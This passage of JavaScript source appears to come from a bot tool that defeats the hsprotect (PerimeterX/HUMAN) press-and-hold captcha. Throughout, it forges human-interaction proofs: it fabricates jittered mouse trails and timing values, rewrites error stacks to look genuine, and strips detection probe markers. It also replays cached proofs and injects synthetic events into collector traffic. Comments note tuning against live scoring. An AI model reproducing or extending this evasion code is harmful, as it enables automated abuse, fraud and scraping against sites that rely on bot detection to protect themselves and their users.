          if (Number.isFinite(u0R3)) ev.d["R3c9PQEXNg8="] = Math.round(u0R3 + 210 + Math.random() * 110);
        } else if (synthetic && (ev.t === "PX561" || ev.t === "JDBeOmJSWwo=" || ev.t === "BFA+GkExMiE=")) {
          const hu = Number(ev.d["HUlnQ1slanM="]);
          if (Number.isFinite(hu)) ev.d["HUlnQ1slanM="] = Math.round(hu + 1);
        }
      }
      const changed = JSON.stringify(events) !== before;
      if (changed) push("synthetic_u0_final_shifted", { qi, source: u0Info && u0Info.source, tags: events.map(ev => ev && ev.t).filter(Boolean) });
      return changed;
    } catch (e) {
      push("synthetic_u0_shift_error", { qi, error: String(e && e.message || e) });
      return false;
    }
  }
  function removeSyntheticU0Bfa(events, qi) {
    try {
      qi = String(qi || "");
      const u0Info = getU0ForFinalNormalization(qi);
      if (!Array.isArray(events)) return false;
      const shortStyle = useShortNoU0ProofStyle(qi);
      const anyShortProofData = events.some(ev => ev && ev.t === "PX561" && ev.d && looksShortManualProofData(ev.d));
      if (!u0Info && !shortStyle && !anyShortProofData) return false;
      const hasPx = events.some(ev => ev && ev.t === "PX561");
      if (!hasPx) return false;
      const before = events.map(ev => ev && ev.t).filter(Boolean);
      let removed = 0;
      const preserveBfa = !!(AUTO_ACTIONS && AUTO_ACTIONS.preserveFinalBfa);
      if (!preserveBfa) {
        for (let i = events.length - 1; i >= 0; i--) {
          if (events[i] && events[i].t === "BFA+GkExMiE=") {
            events.splice(i, 1);
            removed++;
          }
        }
      } else if (events.some(ev => ev && ev.t === "BFA+GkExMiE=")) {
        push("synthetic_u0_bfa_preserved", {
          qi,
          source: (u0Info && u0Info.source) || "short_no_u0",
          before
        });
      }
      let interactionChanged = 0;
      for (const ev of events) {
        if (!ev || ev.t !== "PX561" || !ev.d || typeof ev.d !== "object") continue;
        const q = ev.d["DzN+dUlTekE="];
        if (!Array.isArray(q)) continue;
        const beforeQ = JSON.stringify(q);
        const cleaned = q
          .filter(item => !(item && item.PX12343 === "click"))
          .map(item => {
            try {
              if (item && typeof item === "object" && Number(item.PX11652) > 1) item.PX11652 = 1;
            } catch (_) {}
            return item;
          });
        const pointer = (() => {
          for (let i = cleaned.length - 1; i >= 0; i--) {
            if (cleaned[i] && cleaned[i].PX12343 === "pointerup") return cleaned[i];
          }
          return null;
        })();
        const nonPointer = cleaned.filter(item => item && item.PX12343 !== "pointerup");
        const compact = [];
        const evShortStyle = shortStyle || looksShortManualProofData(ev.d);
        if (evShortStyle) {
          const d = ev.d;
          const e = Number(d["eEgJDj4mCD4="]);
          const wi = Number(d["WiZrIB9LbBU="]);
          if (Number.isFinite(e) && Number.isFinite(wi)) {
            normalizeShortNoU0InteractionShape(d, e, wi);
          }
        } else if (nonPointer.length) {
          const first = nonPointer[0];
          try { first.PX11652 = 0; } catch (_) {}
          compact.push(first);
          let cursor = 1;
          // Accepted final proofs consistently compact to five interaction
          // records: one initial movement sample, three follow-up mouseover
          // samples, and the pointerup.  Some live accelerated rounds include
          // a mouseout/mouseover pair around the button edge; keeping that
          // pair produced dz_len=6 and the collector returned -1 even with an
          // exact current-qi Knp.  Drop mouseout here and keep the stable shape.
          const wanted = ["mouseover", "mouseover", "mouseover"];
          for (const typ of wanted) {
            let found = -1;
            for (let i = cursor; i < nonPointer.length; i++) {
              if (nonPointer[i] && nonPointer[i].PX12343 === typ) {
                found = i;
                break;
              }
            }
            if (found < 0) continue;
            const item = nonPointer[found];
            try { item.PX11652 = 1; } catch (_) {}
            compact.push(item);
            cursor = found + 1;
          }
        }
        if (pointer) {
          try { pointer.PX11652 = 1; } catch (_) {}
          compact.push(pointer);
        }
        if (!evShortStyle) ev.d["DzN+dUlTekE="] = compact.length ? compact : cleaned;
        if (JSON.stringify(ev.d["DzN+dUlTekE="]) !== beforeQ) interactionChanged++;
      }
      if (removed) {
        push("synthetic_u0_bfa_removed", {
          qi,
          source: (u0Info && u0Info.source) || "short_no_u0",
          removed,
          before,
          after: events.map(ev => ev && ev.t).filter(Boolean)
        });
      }
      if (interactionChanged) push("synthetic_u0_interaction_normalized", { qi, interactionChanged });
      return !!(removed || interactionChanged);
    } catch (e) {
      push("synthetic_u0_bfa_remove_error", { qi, error: String(e && e.message || e) });
      return false;
    }
  }
  function normalizeSyntheticU0ProofTimingFields(events, qi) {
    try {
      qi = String(qi || "");
      const u0Info = getU0ForFinalNormalization(qi);
      const shortStyle = useShortNoU0ProofStyle(qi);
      if (!Array.isArray(events)) return false;
      const anyShortProofData = events.some(ev => ev && ev.t === "PX561" && ev.d && looksShortManualProofData(ev.d));
      if (!u0Info && !shortStyle && !anyShortProofData) return false;
      const hasPx = events.some(ev => ev && ev.t === "PX561");
      if (!hasPx) return false;
      let changed = 0;
      for (const ev of events) {
        if (!ev || ev.t !== "PX561" || !ev.d || typeof ev.d !== "object") continue;
        const d = ev.d;
        const evShortStyle = shortStyle || looksShortManualProofData(d);
        const before = {
          s3: d["S3sxMQ0YNQo="],
          bzt: d["Bzt2fUFRcw=="],
          ui: d["Ui5jKBREZxs="]
        };
        const ui = Number(d["Ui5jKBREZxs="]);
        if (evShortStyle) {
          if (Number.isFinite(ui) && Object.prototype.hasOwnProperty.call(d, "S3sxMQ0YNQo=")) {
            d["S3sxMQ0YNQo="] = Math.round(ui + 700 + Math.random() * 260);
          }
          if (Number.isFinite(ui) && Object.prototype.hasOwnProperty.call(d, "Bzt2fUFRcw==")) {
            d["Bzt2fUFRcw=="] = Math.round(ui + 55 + Math.random() * 55);
          }
        } else if (Number.isFinite(ui) && Object.prototype.hasOwnProperty.call(d, "S3sxMQ0YNQo=")) {
          d["S3sxMQ0YNQo="] = Math.round(ui + 300 + Math.random() * 240);
        }
        if (!evShortStyle && Object.prototype.hasOwnProperty.call(d, "Bzt2fUFRcw==")) {
          // Successful natural traces carry this timer as an integer.  Keeping a
          // decimal (e.g. 2867.5) passes local shape checks but has correlated
          // with live score|-1 failures, so normalize the type as well as range.
          d["Bzt2fUFRcw=="] = Math.round(2600 + Math.random() * 1300);
        }
        if (JSON.stringify(before) !== JSON.stringify({
          s3: d["S3sxMQ0YNQo="],
          bzt: d["Bzt2fUFRcw=="],
          ui: d["Ui5jKBREZxs="]
        })) {
          changed++;
          push("synthetic_u0_proof_timing_fields_normalized", {
            qi,
            source: (u0Info && u0Info.source) || "short_no_u0",
            before,
            after: {
              s3: d["S3sxMQ0YNQo="],
              bzt: d["Bzt2fUFRcw=="],
              ui: d["Ui5jKBREZxs="]
            }
          });
        }
      }
      return changed > 0;
    } catch (e) {
      push("synthetic_u0_proof_timing_fields_error", { qi, error: String(e && e.message || e) });
      return false;
    }
  }
  function parseCoordPoint(s) {
    const parts = String(s || "").split(",");
    return { x: parts[0] || "0", y: parts[1] || "0", t: Number(parts[2] || 0) };
  }
  function scaleCoordArray(arr, startT, endT) {
    if (!Array.isArray(arr) || arr.length < 2) return arr;
    const pts = arr.map(parseCoordPoint);
    let minT = Infinity, maxT = -Infinity;
    for (const p of pts) {
      if (Number.isFinite(p.t)) {
        minT = Math.min(minT, p.t);
        maxT = Math.max(maxT, p.t);
      }
    }
    if (!Number.isFinite(minT) || !Number.isFinite(maxT) || maxT <= minT) return arr;
    return pts.map(p => {
      const ratio = Math.max(0, Math.min(1, (p.t - minT) / (maxT - minT)));
      const nt = startT + ratio * (endT - startT);
      return `${p.x},${p.y},${Math.round(nt)}`;
    });
  }
  function resampleCoordArray(arr, count, startT, endT, ratios) {
    if (!Array.isArray(arr) || arr.length < 2 || !Number.isFinite(startT) || !Number.isFinite(endT) || endT <= startT) return arr;
    const pts = arr.map(parseCoordPoint);
    const n = Math.max(2, Number(count || 0));
    const rs = Array.isArray(ratios) && ratios.length === n
      ? ratios
      : Array.from({length: n}, (_, i) => n === 1 ? 0 : i / (n - 1));
    return rs.map((rawRatio, i) => {
      const ratio = Math.max(0, Math.min(1, Number(rawRatio) || 0));
      const src = pts[Math.max(0, Math.min(pts.length - 1, Math.round(ratio * (pts.length - 1))))] || pts[0];
      const jitter = (i === 0 || i === rs.length - 1) ? 0 : Math.round((Math.random() * 2 - 1) * 8);
      const nt = Math.max(startT, Math.min(endT, startT + ratio * (endT - startT) + jitter));
      return `${src.x},${src.y},${Math.round(nt)}`;
    });
  }
  function manualizedCoordArray(template, startT, endT, ratios) {
    const n = template.length;
    return template.map((xy, i) => {
      const ratio = Math.max(0, Math.min(1, Number(ratios[i]) || 0));
      const jitterX = (i === 0 || i === n - 1) ? 0 : Math.round((Math.random() * 2 - 1) * 1);
      const jitterY = (i === 0 || i === n - 1) ? 0 : Math.round((Math.random() * 2 - 1) * 1);
      const jitterT = (i === 0 || i === n - 1) ? 0 : Math.round((Math.random() * 2 - 1) * 8);
      const nt = Math.max(startT, Math.min(endT, startT + ratio * (endT - startT) + jitterT));
      return `${Math.round(xy[0] + jitterX)},${Math.round(xy[1] + jitterY)},${Math.round(nt)}`;
    });
  }
  function normalizeShortNoU0PointerFields(d) {
    try {
      if (!d || typeof d !== "object") return false;
      const before = {
        x1: d["FCwlKlJDJxo="],
        y1: d["JV0UW2M3E2o="],
        lx1: d["XiJvJBhCbRM="],
        ly1: d["ajYbMC9eGgY="],
      };
      const rnd = (base, spread) => Math.round((base + (Math.random() * 2 - 1) * spread) * 10) / 10;
      if (Object.prototype.hasOwnProperty.call(d, "FCwlKlJDJxo=")) d["FCwlKlJDJxo="] = rnd(727.2, 1.8);
      if (Object.prototype.hasOwnProperty.call(d, "bjIfNChdGgU=")) d["bjIfNChdGgU="] = rnd(728.0, 1.8);
      if (Object.prototype.hasOwnProperty.call(d, "JV0UW2M3E2o=")) d["JV0UW2M3E2o="] = rnd(685.6, 1.4);
      if (Object.prototype.hasOwnProperty.call(d, "DXV8M0sYfgQ=")) d["DXV8M0sYfgQ="] = rnd(684.0, 1.4);
      if (Object.prototype.hasOwnProperty.call(d, "XiJvJBhCbRM=")) d["XiJvJBhCbRM="] = rnd(206.4, 1.6);
      if (Object.prototype.hasOwnProperty.call(d, "YGARZiUJFVA=")) d["YGARZiUJFVA="] = rnd(207.2, 1.6);
      if (Object.prototype.hasOwnProperty.call(d, "ajYbMC9eGgY=")) d["ajYbMC9eGgY="] = rnd(27.0, 1.0);
      if (Object.prototype.hasOwnProperty.call(d, "UTEgdxdfI0w=")) d["UTEgdxdfI0w="] = rnd(25.4, 1.0);
      return JSON.stringify(before) !== JSON.stringify({
        x1: d["FCwlKlJDJxo="],
        y1: d["JV0UW2M3E2o="],
        lx1: d["XiJvJBhCbRM="],
        ly1: d["ajYbMC9eGgY="],
      });
    } catch (_) {
      return false;
    }
  }
  function normalizeShortNoU0CoordArrays(d, e, wi, ui) {
    try {
      if (!d || typeof d !== "object") return false;
      if (!Number.isFinite(Number(e)) || !Number.isFinite(Number(wi)) || Number(wi) <= Number(e)) return false;
      const startT = Math.round(Number(e) + 165 + Math.random() * 45);
      const endBase = Number.isFinite(Number(ui)) ? Number(ui) : Number(wi);
      const endT = Math.round(Math.max(Number(wi) + 210, endBase + 225 + Math.random() * 70));
      const before = {
        gu: Array.isArray(d["GUloT18mZ3U="]) ? d["GUloT18mZ3U="].length : null,
        jnp: Array.isArray(d["JnpXfGMUUUc="]) ? d["JnpXfGMUUUc="].length : null,
      };
      const guRatios = [0, 0.002, 0.081, 0.480, 0.634, 0.636, 1.0];
      const jnpRatios = [0, 0.0003, 0.037, 0.075, 0.348, 0.349, 0.429, 0.430, 0.483, 0.572, 0.634, 0.637, 1.0];
      const guTemplate = [[209, 68], [208, 64], [207, 59], [206, 58], [206, 59], [207, 59], [207, 57]];
      const jnpTemplate = [[209, 68], [209, 66], [208, 64], [207, 62], [207, 59], [207, 59], [207, 58], [207, 58], [206, 58], [207, 59], [207, 59], [207, 58], [207, 57]];
      if (Array.isArray(d["GUloT18mZ3U="])) {
        d["GUloT18mZ3U="] = manualizedCoordArray(guTemplate, startT, endT, guRatios);
      }
      if (Array.isArray(d["JnpXfGMUUUc="])) {
        d["JnpXfGMUUUc="] = manualizedCoordArray(jnpTemplate, startT, endT, jnpRatios);
      }
      normalizeShortNoU0PointerFields(d);
      const after = {
        gu: Array.isArray(d["GUloT18mZ3U="]) ? d["GUloT18mZ3U="].length : null,
        jnp: Array.isArray(d["JnpXfGMUUUc="]) ? d["JnpXfGMUUUc="].length : null,
      };
      return before.gu !== after.gu || before.jnp !== after.jnp;
    } catch (_) {
      return false;
    }
  }
  function normalizeProofErrorStacks(events) {
    try {
      if (!Array.isArray(events)) return false;
      let changed = 0;
      const captchaUrlFrom = (s) => {
        try {
          const m = String(s || "").match(/https:\/\/captcha\.hsprotect\.net\/PXzC5j78di\/captcha\.js\?a=c&m=0&u=[0-9a-f-]+&v=[0-9a-f-]+/i);
          return m ? m[0] : "";
        } catch (_) {
          return "";
        }
      };
      const build = (kind, oldStack) => {
        const url = captchaUrlFrom(oldStack);
        if (!url) return "";
        const head = "TypeError: Cannot read properties of null (reading '0')\n" +
          "    at pr (https://client.hsprotect.net/PXzC5j78di/main.min.js:2:20658)\n" +
          "    at Yc (https://client.hsprotect.net/PXzC5j78di/main.min.js:3:6505)\n";
        if (kind === "PX561") {
          return head +
            "    at $c (https://client.hsprotect.net/PXzC5j78di/main.min.js:3:7845)\n" +
            `    at ${url}:1724:470987\n` +
            `    at Ts (${url}:1724:219990)\n` +
            `    at ${url}:1724:220025`;
        }
        if (kind === "JDBeOmJSWwo=") {
          return head +
            "    at Object.jc [as PX763] (https://client.hsprotect.net/PXzC5j78di/main.min.js:3:7476)\n" +
            `    at ${url}:1724:471031\n` +
            `    at Ts (${url}:1724:219990)\n` +
            `    at ${url}:1724:220025`;
        }
        return "";
      };
      for (const ev of events) {
        if (!ev || (ev.t !== "PX561" && ev.t !== "JDBeOmJSWwo=") || !ev.d || typeof ev.d !== "object") continue;
        const oldStack = ev.d["W0shQR0nJHc="];
        if (typeof oldStack !== "string") continue;
        const next = build(ev.t, oldStack);
        if (next && next !== oldStack) {
          ev.d["W0shQR0nJHc="] = next;
          changed++;
        }
      }
      if (changed) push("proof_error_stack_normalized", { changed });
      return changed > 0;
    } catch (e) {
      push("proof_error_stack_normalize_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function normalizeProbeGlobalLeaks(events) {
    try {
      if (!Array.isArray(events)) return false;
      let changed = 0;
      for (const ev of events) {
        const d = ev && ev.d;
        if (!d || typeof d !== "object") continue;
        for (const k of Object.keys(d)) {
          const v = d[k];
          if (!Array.isArray(v)) continue;
          const filtered = v.filter(x => !(typeof x === "string" && x.indexOf("__pxProbe") === 0));
          if (filtered.length !== v.length) {
            d[k] = filtered;
            changed++;
          }
        }
      }
      if (changed) push("probe_global_leaks_normalized", { changed });
      return changed > 0;
    } catch (e) {
      push("probe_global_leaks_normalize_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function normalizeProofDataInPayload(d, qi) {
    try {
      if (!d || typeof d !== "object" || !d["GCgpLl1AKRw="]) return false;
      const timingProfile = String((AUTO_ACTIONS && AUTO_ACTIONS.px1200TimingProfile) || "default");
      if (timingProfile === "natural_long") {
        // In natural_long mode PX1200 is already normalized before hsprotect
        // serializes/signs the proof.  The old generic route-side normalizer
        // rewrote e back to ~2s and then align restored only a subset of keys,
        // leaving signed/opaque fields inconsistent (typical bzt~500/s3~35k
        // and dz_len 50).  Do not mutate proof bodies here; let the cached
        // PX1200 alignment below transplant the already-normalized shape.
        return false;
      }
      const oldE = Number(d["eEgJDj4mCD4="] || 0);
      if (!Number.isFinite(oldE)) return false;
      let e = oldE;
      const shortStyle = shouldUseShortProofStyle(qi, d);
      if (shortStyle) {
        if (e < 9300 || e > 10800) {
          e = Math.round(9600 + Math.random() * 950);
          d["eEgJDj4mCD4="] = e;
        }
      } else if (e < 1700 || e > 3400) {
        e = Math.round(1900 + Math.random() * 1350);
        d["eEgJDj4mCD4="] = e;
      }
      let currentDuration = 0;
      try {
        if (Array.isArray(d["ZjoXPCNQGQw="])) currentDuration = Number(d["ZjoXPCNQGQw="][0]);
      } catch (_) {}
      const duration = chooseNormalizedHoldDuration(currentDuration, shortStyle);
      const wi = Math.round(e + duration);
      const ui = wi + Math.round(24 + Math.random() * 18);
      const qs = Number(d["QS07ZwRKPlU="] || Date.now());
      d["GCgpLl1AKRw="] = ["#px-captcha", ""];
      d["ZjoXPCNQGQw="] = [duration];
      d["WiZrIB9LbBU="] = wi;
      d["Ui5jKBREZxs="] = ui;
      if (shortStyle) {
        normalizeShortNoU0AuxTimingFields(d, e, duration, wi, ui, qs);
      } else {
        const pArn = Math.round((Number.isFinite(qs) ? qs : Date.now()) - ui - 6);
        d["PARNQnlrTHQ="] = pArn;
        d["KVkYX2w2GWg="] = [pArn + e + (ui - wi)];
        if ("XQUsAxhpKjU=" in d) d["XQUsAxhpKjU="] = ui + 5;
      }
      if (Array.isArray(d["DzN+dUlTekE="])) {
        const delta = e - oldE;
        const q = [];
        for (const item of d["DzN+dUlTekE="]) {
          if (item && item.PX12343 === "click") continue;
          q.push(item);
        }
        for (const item of q) {
          if (item && item.PX12343 === "pointerup") item.PX11699 = wi;
          else if (item && Number.isFinite(Number(item.PX11699))) item.PX11699 = Math.max(0, Math.round(Number(item.PX11699) + delta));
        }
        d["DzN+dUlTekE="] = q;
        if (shortStyle) normalizeShortNoU0InteractionShape(d, e, wi);
      }
      if (shortStyle) {
        normalizeShortNoU0CoordArrays(d, e, wi, ui);
      } else {
        d["GUloT18mZ3U="] = scaleCoordArray(d["GUloT18mZ3U="], Math.max(0, e - 120), Math.max(e + 300, wi - 3000));
        d["JnpXfGMUUUc="] = scaleCoordArray(d["JnpXfGMUUUc="], Math.max(0, e - 120), Math.max(e + 320, wi - 3000));
      }
      return true;
    } catch (_) {
      return false;
    }
  }
  function replacePx561FromCachedPx1200(events) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.replacePx561FromPx1200) return false;
      const proof = state.lastPx1200Proof;
      if (!proof || typeof proof !== "object") return false;
      const maxAge = Number(AUTO_ACTIONS.replacePx561MaxAgeMs || 5000);
      const ageMs = Date.now() - Number(state.lastPx1200ProofAt || 0);
      if (isFinite(maxAge) && maxAge > 0 && ageMs > maxAge) {
        push("px561_replace_skipped_stale", { ageMs, maxAge });
        return false;
      }
      let changed = false;
      for (const ev of events || []) {
        if (!ev || ev.t !== "PX561" || !ev.d || typeof ev.d !== "object") continue;
        const before = ev.d;
        ev.d = jsonClone(proof);
        changed = true;
        push("px561_replaced_from_px1200", {
          ageMs,
          before: {
            gc: safe(before["GCgpLl1AKRw="]),
            e: before["eEgJDj4mCD4="],
            wi: before["WiZrIB9LbBU="],
            z: safe(before["ZjoXPCNQGQw="]),
            ui: before["Ui5jKBREZxs="],
            hash: before["Ew9iCVZkZD4="]
          },
          after: {
            gc: safe(ev.d["GCgpLl1AKRw="]),
            e: ev.d["eEgJDj4mCD4="],
            wi: ev.d["WiZrIB9LbBU="],
            z: safe(ev.d["ZjoXPCNQGQw="]),
            ui: ev.d["Ui5jKBREZxs="],
            hash: ev.d["Ew9iCVZkZD4="]
          }
        });
      }
      return changed;
    } catch (e) {
      push("px561_replace_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function alignPx561TimingFromCachedPx1200(events) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.alignPx561TimingFromPx1200) return false;
      let proof = null;
      let proofSource = "cached_px1200";
      try {
        for (const ev of events || []) {
          if (ev && ev.t === "W0cqQR4rLnA=" && ev.d && typeof ev.d === "object") {
            proof = ev.d;
            proofSource = "same_payload_w0c";
            break;
          }
        }
      } catch (_) {}
      if (!proof) proof = state.lastPx1200Proof;
      if (!proof || typeof proof !== "object") return false;
      const maxAge = Number(AUTO_ACTIONS.replacePx561MaxAgeMs || 5000);
      const ageMs = Date.now() - Number(state.lastPx1200ProofAt || 0);
      if (proofSource === "cached_px1200" && isFinite(maxAge) && maxAge > 0 && ageMs > maxAge) {
        push("px561_align_skipped_stale", { ageMs, maxAge });
        return false;
      }
      const timingKeys = [
        "GCgpLl1AKRw=",
        "eEgJDj4mCD4=",
        "WiZrIB9LbBU=",
        "ZjoXPCNQGQw=",
        "Ui5jKBREZxs=",
        "PARNQnlrTHQ=",
        "KVkYX2w2GWg=",
        "QS07ZwRKPlU=",
        "XQUsAxhpKjU=",
        "KDhZPm1XWAo=",
        "KVkYX28zG2o=",
        "QABxRgZqcXQ="
      ];
      const naturalLong = String((AUTO_ACTIONS && AUTO_ACTIONS.px1200TimingProfile) || "default") === "natural_long";
      const naturalShapeKeys = [
        "Bzt2fUFRcw==",
        "S3sxMQ0YNQo=",
        "STk4fwxXPE4=",
        "DzN+dUlTekE=",
        "GUloT18mZ3U=",
        "JnpXfGMUUUc="
      ];
      let changed = false;
      for (const ev of events || []) {
        if (!ev || ev.t !== "PX561" || !ev.d || typeof ev.d !== "object") continue;
        const before = {};
        for (const k of timingKeys) before[k] = jsonClone(ev.d[k]);
        for (const k of timingKeys) {
          if (Object.prototype.hasOwnProperty.call(proof, k)) ev.d[k] = jsonClone(proof[k]);
        }
        if (naturalLong) {
          for (const k of naturalShapeKeys) {
            if (Object.prototype.hasOwnProperty.call(proof, k)) ev.d[k] = jsonClone(proof[k]);
          }
        }
        try {
          const e = Number(ev.d["eEgJDj4mCD4="] || 0);
          const wi = Number(ev.d["WiZrIB9LbBU="] || 0);
          const ui = Number(ev.d["Ui5jKBREZxs="] || 0);
          if (Number.isFinite(ui) && Object.prototype.hasOwnProperty.call(ev.d, "XQUsAxhpKjU=") && !Object.prototype.hasOwnProperty.call(proof, "XQUsAxhpKjU=")) {
            ev.d["XQUsAxhpKjU="] = Math.round(ui + 5);
          }
          if (Number.isFinite(e) && Number.isFinite(wi) && wi > e) {
            const alignedShortStyle = !naturalLong && (useShortNoU0ProofStyle("") || looksShortManualProofData(ev.d));
            if (alignedShortStyle) {
              normalizeShortNoU0CoordArrays(ev.d, e, wi, ui);
              normalizeShortNoU0InteractionShape(ev.d, e, wi);
              let duration = 0;
              if (Array.isArray(ev.d["ZjoXPCNQGQw="])) duration = Number(ev.d["ZjoXPCNQGQw="][0]);
              normalizeShortNoU0AuxTimingFields(ev.d, e, duration, wi, ui, ev.d["QS07ZwRKPlU="]);
            } else if (!naturalLong) {
              const startT = Math.max(0, e - 120);
              const endT = Math.max(e + 300, wi - 3000);
              ev.d["GUloT18mZ3U="] = scaleCoordArray(ev.d["GUloT18mZ3U="], startT, endT);
              ev.d["JnpXfGMUUUc="] = scaleCoordArray(ev.d["JnpXfGMUUUc="], startT, endT);
            }
            if (Array.isArray(ev.d["DzN+dUlTekE="])) {
              for (const item of ev.d["DzN+dUlTekE="]) {
                if (item && item.PX12343 === "pointerup") item.PX11699 = Math.round(wi);
              }
            }
          }
        } catch (e) {
          push("px561_align_envelope_error", { error: String(e && e.message || e) });
        }
        changed = true;
        push("px561_timing_aligned_from_px1200", {
          source: proofSource,
          ageMs,
          before: {
            gc: safe(before["GCgpLl1AKRw="]),
            e: before["eEgJDj4mCD4="],
            wi: before["WiZrIB9LbBU="],
            z: safe(before["ZjoXPCNQGQw="]),
            ui: before["Ui5jKBREZxs="],
            p: before["PARNQnlrTHQ="],
            kv: safe(before["KVkYX2w2GWg="]),
            qs: before["QS07ZwRKPlU="]
          },
          after: {
            gc: safe(ev.d["GCgpLl1AKRw="]),
            e: ev.d["eEgJDj4mCD4="],
            wi: ev.d["WiZrIB9LbBU="],
            z: safe(ev.d["ZjoXPCNQGQw="]),
            ui: ev.d["Ui5jKBREZxs="],
            p: ev.d["PARNQnlrTHQ="],
            kv: safe(ev.d["KVkYX2w2GWg="]),
            qs: ev.d["QS07ZwRKPlU="]
          }
        });
      }
      return changed;
    } catch (e) {
      push("px561_align_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function hasExactKnpForQi(qi) {
    try {
      qi = String(qi || "1604064986000");
      const item = state.knpByQi && state.knpByQi[qi];
      return !!(item && item["U0MpSRYgLHo="] && item["U0MpSRYgLHo="].en);
    } catch (_) {
      return false;
    }
  }
  function hasFallbackKnpForQi(qi) {
    try {
      if (AUTO_ACTIONS && AUTO_ACTIONS.knpFallbackLast === false) return false;
      qi = String(qi || "1604064986000");
      if (state.fallbackKnpByQi && state.fallbackKnpByQi[qi] && state.fallbackKnpByQi[qi]["U0MpSRYgLHo="] && state.fallbackKnpByQi[qi]["U0MpSRYgLHo="].en) return true;
      if (state.lastKnpData && state.lastKnpData["U0MpSRYgLHo="] && state.lastKnpData["U0MpSRYgLHo="].en) return true;
      return false;
    } catch (_) {
      return false;
    }
  }
  function shouldWaitForExactFinalKnp(body, url) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.injectKnpSandboxEvent) return null;
      const waitMs = Number(AUTO_ACTIONS.exactKnpWaitMs || 0);
      if (!Number.isFinite(waitMs) || waitMs <= 0) return null;
      if (typeof body !== "string" || body.indexOf("payload=") < 0) return null;
      if (!/collector-.*hsprotect\.net/.test(String(url || ""))) return null;
      if (body.indexOf("appId=PXzC5j78di") < 0) return null;
      const parsed = decodeCollectorPayload(body);
      rememberCollectorQi(parsed.qi, "exact_wait_probe");
      const ts = (parsed.events || []).map(ev => ev && ev.t).filter(Boolean);
      if (ts.indexOf("PX561") < 0 || ts.indexOf("aRVTHy91Wio=") < 0) return null;
      const qi = String(parsed.qi || "1604064986000");
      let packetKnpExact = false;
      if (ts.indexOf("KnpQcG8ZVUI=") >= 0) {
        try {
          for (const ev of parsed.events || []) {
            if (ev && ev.t === "KnpQcG8ZVUI=" && ev.d && ev.d["U0MpSRYgLHo="] && ev.d["U0MpSRYgLHo="].en) {
              packetKnpExact = true;
              state.knpByQi = state.knpByQi || {};
              if (!state.knpByQi[qi]) state.knpByQi[qi] = jsonClone(ev.d);
              rememberLastKnp(qi, ev.d);
              break;
            }
          }
        } catch (_) {}
        if (!packetKnpExact && !hasExactKnpForQi(qi)) return null;
      }
      const alreadyExact = packetKnpExact || hasExactKnpForQi(qi);
      const fallbackReady = !alreadyExact && hasFallbackKnpForQi(qi);
      let effectiveWaitMs = alreadyExact ? 0 : waitMs;
      if (!alreadyExact && fallbackReady) {
        // The exact current-qi Knp is still preferred, but some live rounds close
        // the captcha iframe before the full exact wait/hard-timeout path fires.
        // When a prior-qi fallback is already cached, give exact a short grace
        // window, then send the final proof instead of losing the packet entirely.
        const graceMs = Number(AUTO_ACTIONS.exactKnpFallbackGraceMs);
        if (Number.isFinite(graceMs) && graceMs >= 0) {
          effectiveWaitMs = Math.min(effectiveWaitMs, graceMs);
        }
      }
      // Even when the exact Knp broker has already populated the cache, keep the
      // final PX561 packet on the delayed path.  That path is also responsible
      // for inserting the missing synthetic U0 before raw seq=2 finals.  Letting
      // already-exact finals fall through the normal synchronous path regresses
      // to seq=2 final-without-U0, which live traces score as -1.
      // Fallback Knp is useful as a safety net, but do not let it short-circuit
      // the exact-qi wait.  The accepted live sample used an exact current-qi
      // Knp in the final proof, while failed runs that returned score|1 showed
      // `prior_match=...` (fallback from the previous qi).  Wait for exact first
      // and only enable fallback after that wait expires.
      return { parsed, qi, tags: ts, waitMs: effectiveWaitMs, requestedWaitMs: waitMs, alreadyExact, fallbackReady };
    } catch (e) {
      push("exact_knp_wait_probe_error", { error: String(e && e.message || e) });
      return null;
    }
  }
  function waitForExactKnp(qi, waitMs) {
    qi = String(qi || "1604064986000");
    const deadline = REAL_DATE_NOW() + Math.max(0, Number(waitMs || 0));
    let ticksLeft = Math.max(1, Math.ceil(Math.max(0, Number(waitMs || 0)) / 120) + 2);
    return new Promise(resolve => {
      const tick = () => {
        try {
          if (hasExactKnpForQi(qi)) return resolve(true);
          ticksLeft -= 1;
          if (REAL_DATE_NOW() >= deadline || ticksLeft <= 0) return resolve(false);
          const started = Number(state.knpStartedByQi && state.knpStartedByQi[qi] || 0);
          const retryAfter = Math.max(900, Number((AUTO_ACTIONS && AUTO_ACTIONS.knpBrokerRetryMs) || 2400));
          if (!started || REAL_DATE_NOW() - started > retryAfter) {
            try { delete state.knpStartedByQi[qi]; } catch (_) { state.knpStartedByQi[qi] = 0; }
            startKnpSandboxProbe(qi);
            requestTopKnpSandbox(qi);
          }
        } catch (_) {}
        REAL_SET_TIMEOUT(tick, 120);
      };
      tick();
    });
  }
  async function maybeSendSyntheticU0BeforeFinal(wait, body, url) {
    try {
      if (AUTO_ACTIONS && AUTO_ACTIONS.syntheticU0Enabled === false) {
        push("synthetic_u0_skipped_disabled", { qi: wait && wait.qi });
        return false;
      }
      if (!wait || !wait.parsed || !wait.qi) return false;
      const qi = String(wait.qi || "");
      state.u0SeenByQi = state.u0SeenByQi || {};
      if (state.u0SeenByQi[qi]) return false;
      state.syntheticU0SentByQi = state.syntheticU0SentByQi || {};
      if (state.syntheticU0SentByQi[qi]) return false;
      const form = parseRawForm(body);
      const finalSeq = Number(form.seq);
      const finalRsc = Number(form.rsc);
      const u0 = makeSyntheticU0FromFinalEvents(wait.parsed.events);
      if (!u0 || !Number.isFinite(finalSeq)) return false;
      // Natural successful rounds use U0 at seq=N-1 and the final proof at
      // seq=N.  Some short-hold traces already allocate that final seq before
      // the missing U0 is sent (raw final seq=3); older traces put the final at
      // seq=2.  Fill the missing slot when it exists, otherwise insert at the
      // current seq and bump the final/post-final traffic by one.
      const finalAlreadyReservedU0Slot = finalSeq >= 3;
      const seq = finalAlreadyReservedU0Slot ? Math.max(0, Math.round(finalSeq - 1)) : Math.max(0, Math.round(finalSeq));
      const rsc = finalAlreadyReservedU0Slot && Number.isFinite(finalRsc)
        ? Math.max(0, Math.round(finalRsc - 1))
        : finalRsc;
      const u0Parsed = {
        form: Object.assign({}, wait.parsed.form || form),
        qi,
        events: [u0]
      };
